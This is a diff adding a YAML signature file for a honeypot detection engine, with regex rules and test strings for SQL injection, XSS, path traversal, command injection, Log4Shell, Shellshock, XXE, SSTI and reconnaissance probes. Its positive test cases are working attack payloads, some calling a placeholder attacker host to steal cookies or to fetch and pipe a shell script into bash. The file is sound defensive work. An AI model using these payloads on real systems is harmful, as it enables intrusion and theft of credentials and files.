@@ -1,0 +1,308 @@
+# VIGILANCE Honeypot Detection Signatures
+# Version: 1.0.0
+# Engine: Vigilance Signature Engine (Node.js/Express Middleware)
+# Evaluation Model: Multi-location pattern evaluation with bounded payload inspection
+
+rules:
+  # ── 1. SQL Injection (Basic) ──────────────────────────────────────────────────
+  - id: "SIG-SQLI-001"
+    name: "Classic SQL Injection - Tautology & Comment"
+    category: "SQL_INJECTION"
+    description: "Detects classic OR/AND tautologies and SQL comment terminators designed to bypass authentication or alter queries."
+    severity_weight: 35
+    enabled: true
+    locations: ["query", "body", "path"]
+    matching_logic:
+      type: "regex"
+      patterns:
+        - "(?i)(\\b(or|and)\\b\\s+['\"]?\\w+['\"]?\\s*=\\s*['\"]?\\w+|'\\s*or\\s*'1'='1|--\\s*$|/\\*.*?\\*/)"
+    false_positive_considerations: "Search queries containing natural language words 'or' / 'and' paired with punctuation."
+    test_cases:
+      positive:
+        - "admin' OR '1'='1"
+        - "' or 1=1--"
+        - "id=10 OR 1=1"
+      negative:
+        - "search=rock and roll"
+        - "title=Lord of the rings"
+
+  # ── 2. Advanced SQL Injection ─────────────────────────────────────────────────
+  - id: "SIG-SQLI-002"
+    name: "Advanced SQL Injection - UNION / Sleep / Blind Injection"
+    category: "SQL_INJECTION"
+    description: "Detects UNION-based data extraction, database schema enumeration (information_schema), and time-based blind injection (pg_sleep, sleep, waitfor delay)."
+    severity_weight: 45
+    enabled: true
+    locations: ["query", "body", "path"]
+    matching_logic:
+      type: "regex"
+      patterns:
+        - "(?i)(\\bunion\\b\\s+(\\ball\\b\\s+)?\\bselect\\b|\\b(pg_sleep|sleep)\\s*\\(\\s*\\d+\\s*\\)|waitfor\\s+delay\\s+['\"]|information_schema\\.(tables|columns))"
+    false_positive_considerations: "Very low. Rare in benign intranet application data unless reviewing SQL documentation."
+    test_cases:
+      positive:
+        - "1 UNION SELECT null, username, password FROM users--"
+        - "'; SELECT pg_sleep(5)--"
+        - "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+      negative:
+        - "union_status=active"
+        - "sleep_mode=true"
+
+  # ── 3. Cross-Site Scripting (XSS) ─────────────────────────────────────────────
+  - id: "SIG-XSS-001"
+    name: "Reflected & Stored XSS Script Insertion"
+    category: "CROSS_SITE_SCRIPTING"
+    description: "Detects HTML tag injection, inline script execution handlers (onload, onerror), and javascript: pseudo-protocols."
+    severity_weight: 30
+    enabled: true
+    locations: ["query", "body", "headers.referer", "headers.user-agent"]
+    matching_logic:
+      type: "regex"
+      patterns:
+        - "(?i)(<\\s*script[^>]*>.*?</\\s*script\\s*>|<\\s*img[^>]+src=[^>]*on(error|load)\\s*=|<\\s*svg[^>]*on(load|error)\\s*=|javascript\\s*:\\s*\\w+)"
+    false_positive_considerations: "Markdown content containing escaped HTML documentation or rich text formatting."
+    test_cases:
+      positive:
+        - "<script>alert(1)</script>"
+        - "<img src=x onerror=alert(document.cookie)>"
+        - "<svg onload=fetch('http://attacker.com?c='+document.cookie)>"
+      negative:
+        - "Math equation: 5 < script and 10 > count"
+        - "Hello world! This is a test."
+
+  # ── 4. Path Traversal & Directory Climbing ────────────────────────────────────
+  - id: "SIG-TRAV-001"
+    name: "Path Traversal & Arbitrary File Access"
+    category: "PATH_TRAVERSAL"
+    description: "Detects relative directory navigation sequence (../ or ..\\) and root path referencing targeting system files like /etc/passwd or C:\\windows\\win.ini."
+    severity_weight: 40
+    enabled: true
+    locations: ["path", "query", "body"]
+    matching_logic:
+      type: "regex"
+      patterns:
+        - "((\\.\\.[\\/\\\\])+|\\/etc\\/passwd|\\/etc\\/shadow|c:\\\\windows\\\\(system32|win\\.ini))"
+    false_positive_considerations: "Legitimate file path references in administrative file upload or document management utilities."
+    test_cases:
+      positive:
+        - "../../etc/passwd"
+        - "..\\..\\windows\\win.ini"
+        - "filename=/etc/shadow"
+      negative:
+        - "path=uploads/images/avatar.png"
+        - "version=2.0..3"
+
+  # ── 5. Command Injection ──────────────────────────────────────────────────────
+  - id: "SIG-CMDI-001"
+    name: "OS Command Injection"
+    category: "COMMAND_INJECTION"
+    description: "Detects command chaining operators (&, |, ;) paired with common Unix/Windows shell commands (cat, whoami, id, uname, curl, wget, powershell)."
+    severity_weight: 45
+    enabled: true
+    locations: ["query", "body", "headers.user-agent"]
+    matching_logic:
+      type: "regex"
+      patterns:
+        - "(?i)([;&|`$]\\s*(\\b(cat\\s+\\/|whoami|id\\b|uname|curl\\b|wget\\b|powershell|cmd\\.exe|bash\\s+-i|sh\\s+-i)\\b)|\\$\\([^)]+\\))"
+    false_positive_considerations: "Query parameters containing legitimate search syntax like 'music | audio'."
+    test_cases:
+      positive:
+        - "test; whoami"
+        - "127.0.0.1 | cat /etc/passwd"
+        - "`id`"
+      negative:
+        - "category=games & esports"
+        - "name=pro_gamer"
+
+  # ── 6. Log4Shell (CVE-2021-44228) ─────────────────────────────────────────────
+  - id: "SIG-LOG4J-001"
+    name: "Log4Shell JNDI Lookup Injection"
+    category: "LOG4SHELL"
+    description: "Detects JNDI LDAP/RMI lookup expressions used in Log4j remote code execution attempts across paths, queries, and headers."
+    severity_weight: 50
+    enabled: true
+    locations: ["headers.user-agent", "headers.x-forwarded-for", "query", "body", "path"]
+    matching_logic:
+      type: "regex"
+      patterns:
+        - "(?i)\\$\\{\\s*(jndi|\\$\\{lower:j\\}\\$\\{lower:n\\}\\$\\{lower:d\\}\\$\\{lower:i\\})\\s*:[a-z]+"
+    false_positive_considerations: "Extremely low false-positive rate. JNDI string interpolation has no benign web use."
+    test_cases:
+      positive:
+        - "${jndi:ldap://attacker.com/exploit}"
+        - "${jndi:rmi://192.168.1.50:1099/obj}"
+        - "${${lower:j}ndi:dns://attacker.com}"
+      negative:
+        - "template=${username}"
+        - "cost=$100"
+
+  # ── 7. PHP Remote Code Execution ──────────────────────────────────────────────
+  - id: "SIG-PHP-001"
+    name: "PHP Code Execution & Wrapper Injection"
+    category: "CODE_INJECTION"
+    description: "Detects PHP tag openings, dangerous execution primitives (system, exec, passthru, eval, assert), and php:// stream wrappers."
+    severity_weight: 40
+    enabled: true
+    locations: ["query", "body", "path"]
+    matching_logic:
+      type: "regex"
+      patterns:
+        - "(?i)(<\\?php|php:\\/\\/(input|filter)|\\b(eval|assert|passthru|shell_exec|base64_decode)\\s*\\()"
+    false_positive_considerations: "Code snippet discussions in tech intranet forums or documentation markdown."
+    test_cases:
+      positive:
+        - "<?php system($_GET['cmd']); ?>"
+        - "file=php://filter/convert.base64-encode/resource=index.php"
+        - "cmd=passthru('ls')"
+      negative:
+        - "lang=php"
+        - "evaluation_criteria=standard"
+
+  # ── 8. Shellshock (CVE-2014-6271) ─────────────────────────────────────────────
+  - id: "SIG-SHELLSHOCK-001"
+    name: "GNU Bash Environment Variable Code Injection (Shellshock)"
+    category: "COMMAND_INJECTION"
+    description: "Detects bash function definition syntax followed by trailing command execution injected via HTTP headers."
+    severity_weight: 50
+    enabled: true
+    locations: ["headers.user-agent", "headers.referer", "headers.cookie", "headers.x-forwarded-for"]
+    matching_logic:
+      type: "regex"
+      patterns:
+        - "\\(\\s*\\)\\s*\\{\\s*[:;]\\s*;\\s*\\}\\s*;"
+    false_positive_considerations: "Zero expected false positives in standard web traffic."
+    test_cases:
+      positive:
+        - "() { :;}; /bin/bash -c 'echo vulnerable'"
+        - "() { :; }; /usr/bin/curl http://attacker.com/rev.sh | bash"
+      negative:
+        - "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+        - "() => { return true; }"
+
+  # ── 9. Sensitive File Discovery & Decoy Probes ────────────────────────────────
+  - id: "SIG-DISC-001"
+    name: "Decoy Environment & Configuration File Discovery"
+    category: "RECONNAISSANCE"
+    description: "Detects automated reconnaissance probing for environment variables (.env), git repositories (.git/config), AWS credentials, and backup dumps."
+    severity_weight: 35
+    enabled: true
+    locations: ["path"]
+    matching_logic:
+      type: "regex"
+      patterns:
+        - "(?i)(\\/\\.env(\\.[a-z]+)?|\\/\\.git\\/(config|HEAD)|\\/\\.aws\\/credentials|\\/wp-config\\.php|\\/(backup|dump|db)\\.sql)"
+    false_positive_considerations: "None for an esports intranet that does not host public git trees or WordPress."
+    test_cases:
+      positive:
+        - "/.env"
+        - "/.git/config"
+        - "/wp-config.php"
+        - "/backup.sql"
+      negative:
+        - "/api/v1/tournaments"
+        - "/images/banner.jpg"
+
+  # ── 10. NoSQL Injection ───────────────────────────────────────────────────────
+  - id: "SIG-NOSQL-001"
+    name: "MongoDB / NoSQL Query Operator Injection"
+    category: "NOSQL_INJECTION"
+    description: "Detects MongoDB evaluation operators ($where, $ne, $gt, $regex) passed via query string or JSON payload to circumvent query constraints."
+    severity_weight: 35
+    enabled: true
+    locations: ["query", "body"]
+    matching_logic:
+      type: "regex"
+      patterns:
+        - "(\"\\$(where|ne|gt|gte|lt|lte|regex|in|nin)\"\\s*:|\\$(where|ne|gt|gte|lt|lte|regex)\\[)"
+    false_positive_considerations: "Financial or math expressions referencing currency symbols ($)."
+    test_cases:
+      positive:
+        - "{\"username\": \"admin\", \"password\": {\"$ne\": \"\"}}"
+        - "{\"filter\": {\"$where\": \"this.password.length > 0\"}}"
+        - "user[$ne]=null"
+      negative:
+        - "price=$15.00"
+        - "{\"query\": \"latest match results\"}"
+
+  # ── 11. XML External Entity (XXE) Injection ───────────────────────────────────
+  - id: "SIG-XXE-001"
+    name: "XML External Entity (XXE) Resolution"
+    category: "XXE_INJECTION"
+    description: "Detects DOCTYPE definitions, ENTITY declarations, and SYSTEM file references inside XML request payloads."
+    severity_weight: 40
+    enabled: true
+    locations: ["body"]
+    matching_logic:
+      type: "regex"
+      patterns:
+        - "(?i)(<!DOCTYPE[^>]+SYSTEM|<!ENTITY[^>]+SYSTEM\\s+['\"](file|http|ftp):\\/\\/)"
+    false_positive_considerations: "Legitimate XML document schema validation in legacy enterprise SOAP feeds."
+    test_cases:
+      positive:
+        - "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"
+        - "<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">"
+      negative:
+        - "<?xml version=\"1.0\" encoding=\"UTF-8\"?><match><id>123</id></match>"
+        - "Standard JSON payload"
+
+  # ── 12. Server-Side Template Injection (SSTI) ─────────────────────────────────
+  - id: "SIG-SSTI-001"
+    name: "Server-Side Template Engine Expression Injection"
+    category: "SSTI"
+    description: "Detects template delimiters and mathematical evaluation payloads (${7*7}, {{7*7}}, <%= 7*7 %>) commonly used to verify SSTI in Jinja2, Twig, or Freemarker."
+    severity_weight: 35
+    enabled: true
+    locations: ["query", "body"]
+    matching_logic:
+      type: "regex"
+      patterns:
+        - "(\\{\\{\\s*\\d+\\s*\\*\\s*\\d+\\s*\\}\\}|\\$\\{\\s*\\d+\\s*\\*\\s*\\d+\\s*\\}|<\\%=\\s*\\d+\\s*\\*\\s*\\d+\\s*\\%>|\\{\\{['\"].*?['\"]\\.__class__)"
+    false_positive_considerations: "Frontend framework template literals passed inadvertently in user inputs."
+    test_cases:
+      positive:
+        - "{{7*7}}"
+        - "${7*7}"
+        - "{{''.__class__.__mro__[1].__subclasses__()}}"
+      negative:
+        - "Cost calculation: 7 * 7 = 49"
+        - "Normal message: {{username}}"
+
+  # ── 13. Automated Vulnerability Scanner & Bot Signatures ──────────────────────
+  - id: "SIG-SCAN-001"
+    name: "Automated Security Scanner Fingerprint"
+    category: "SCANNER"
+    description: "Detects signature strings and user agent fingerprints of known automated attack tools (sqlmap, nikto, masscan, nmap, dirbuster, gobuster, acunetix)."
+    severity_weight: 25
+    enabled: true
+    locations: ["headers.user-agent"]
+    matching_logic:
+      type: "regex"
+      patterns:
+        - "(?i)(sqlmap|nikto|masscan|nmap\\s+scripting\\s+engine|dirbuster|gobuster|acunetix|wpscan|nessus|openvas)"
+    false_positive_considerations: "Custom QA test scripts using generic user agents or scanner names in research."
+    test_cases:
+      positive:
+        - "sqlmap/1.7.2#stable (https://sqlmap.org)"
+        - "Mozilla/5.00 (Nikto/2.1.6) (EWS/1.05)"
+        - "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+      negative:
+        - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+        - "curl/7.88.1"
+
+  # ── 14. Credential Stuffing & Brute Force Probe ───────────────────────────────
+  - id: "SIG-AUTH-001"
+    name: "Credential Stuffing Pattern on Decoy Authentication Endpoint"
+    category: "CREDENTIAL_STUFFING"
+    description: "Detects common dictionary usernames or rapid credential testing against the decoy intranet authentication endpoint."
+    severity_weight: 30
+    enabled: true
+    locations: ["path", "body"]
+    matching_logic:
+      type: "custom"
+      rule_handler: "credential_stuffing_evaluator"
+    false_positive_considerations: "A legitimate employee mistyping their password twice."
+    test_cases:
+      positive:
+        - "target=/api/v1/auth/login with known default wordlist credentials"
+      negative:
+        - "Standard login with normal single authentication attempt"
